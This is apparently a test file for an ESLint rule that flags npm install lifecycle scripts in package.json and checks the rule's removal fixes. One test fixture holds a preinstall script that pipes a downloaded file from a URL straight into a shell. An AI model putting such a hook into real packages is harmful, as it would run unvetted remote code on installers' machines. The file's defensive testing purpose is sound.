import test from 'node:test';
import assert from 'node:assert/strict';
import {Linter} from 'eslint';
import json from '@eslint/json';
import {getTester} from './utils/test.js';

const {test: snapshotTest, rule} = getTester(import.meta);
const linter = new Linter();
const config = [{
	files: ['**'],
	language: 'json/json',
	plugins: {json, 'rule-to-test': {rules: {'no-install-scripts': rule}}},
	rules: {'rule-to-test/no-install-scripts': 'error'},
}];
const applyFix = (code, fix) => code.slice(0, fix.range[0]) + fix.text + code.slice(fix.range[1]);

snapshotTest.snapshot({
	valid: [
		'{"name": "foo"}',
		'{"scripts": {"build": "tsc", "test": "ava"}}',
		// `prepublishOnly` runs only on publish, so it is not an install script.
		'{"scripts": {"prepublishOnly": "npm publish"}}',
		'{"scripts": {"prepack": "npm run build"}}',
		// These run on the author's machine, and on a consumer's only for a git dependency, which npm 12 refuses by default.
		'{"scripts": {"preprepare": "node ./scripts/setup.js"}}',
		'{"scripts": {"postprepare": "node ./scripts/teardown.js"}}',
		'{"scripts": {"test": "ava"}}',
		'{"scripts": {"prepare": "npm run build"}}',
		// A private package is never installed from the registry, so its install scripts run only on the author's machine.
		'{"name": "root", "private": true, "workspaces": ["packages/*"], "scripts": {"postinstall": "husky"}}',
	],
	invalid: [
		`{
	"scripts": {
		"preinstall": "node ./scripts/setup.js"
	}
}`,
		`{
	"scripts": {
		"install": "node-gyp rebuild"
	}
}`,
		`{
	"scripts": {
		"build": "tsc",
		"postinstall": "node ./scripts/setup.js"
	}
}`,
		// Removing only the effective member would leave the shadowed duplicate running.
		`{
	"scripts": {
		"preinstall": "curl https://example.com | sh",
		"preinstall": "echo clean"
	}
}`,
	],
});

test('removing the only script takes the `scripts` field with it', () => {
	// An empty `scripts` object is what `no-empty-fields` reports, so leaving one behind trades this rule's
	// own report for another's, which is no better than not having removed the script at all.
	const code = '{"name": "x", "scripts": {"postinstall": "node setup.js"}}';
	const [message] = linter.verify(code, config, {filename: 'package.json'});

	assert.equal(applyFix(code, message.suggestions[0].fix), '{"name": "x"}');
});

test('a `scripts` object that keeps another script keeps itself', () => {
	const code = '{"name": "x", "scripts": {"postinstall": "node setup.js", "test": "node --test"}}';
	const [message] = linter.verify(code, config, {filename: 'package.json'});

	assert.equal(applyFix(code, message.suggestions[0].fix), '{"name": "x", "scripts": {"test": "node --test"}}');
});
